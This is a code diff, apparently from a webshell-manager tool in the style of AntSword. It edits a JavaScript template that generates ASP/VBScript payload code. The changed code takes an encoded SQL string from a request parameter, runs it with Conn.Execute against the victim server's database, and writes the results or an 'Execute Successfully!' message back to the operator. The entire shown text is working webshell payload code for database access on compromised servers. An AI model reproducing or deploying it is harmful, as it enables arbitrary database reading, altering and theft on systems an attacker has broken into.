@@ -99,26 +99,29 @@ module.exports = (arg1, arg2, arg3, arg4, arg5, arg6) => ({
         Response.Write HD&Err.Description&CO&RN:
         Err.Clear:
       Else:
-        Set Rs=CreateObject("Adodb.Recordset"):
-        Rs.open ""&bd(Request("${arg2}"))&"",Conn,1,1:
+        Set Rs=Conn.Execute(""&bd(Request("${arg2}"))&""):
         If Err Then:
           Response.Write HD&Err.Number&":"&Err.Description&CO&RN:
           Err.Clear:
         Else:
           Dim FN:
           FN=Rs.Fields.Count-1:
-          For n=0 To FN:
-            Response.Write Rs.Fields.Item(n).Name&CO:
-          Next:
-          Response.Write RN:
-          Do While Not(Rs.Eof Or Rs.Bof):
+          If FN=-1 Then:
+            Response.Write HD&"Execute Successfully!"&CO&RN:
+          Else:
             For n=0 To FN:
-              Response.Write Rs(n):
-              Response.Write CO:
+              Response.Write Rs.Fields.Item(n).Name&CO:
             Next:
             Response.Write RN:
-            Rs.MoveNext:
-          Loop:
+            Do While Not(Rs.Eof Or Rs.Bof):
+              For n=0 To FN:
+                Response.Write Rs(n):
+                Response.Write CO:
+              Next:
+              Response.Write RN:
+              Rs.MoveNext:
+            Loop:
+          End If:
         End If:
         Set Rs=Nothing:
         Conn.Close:
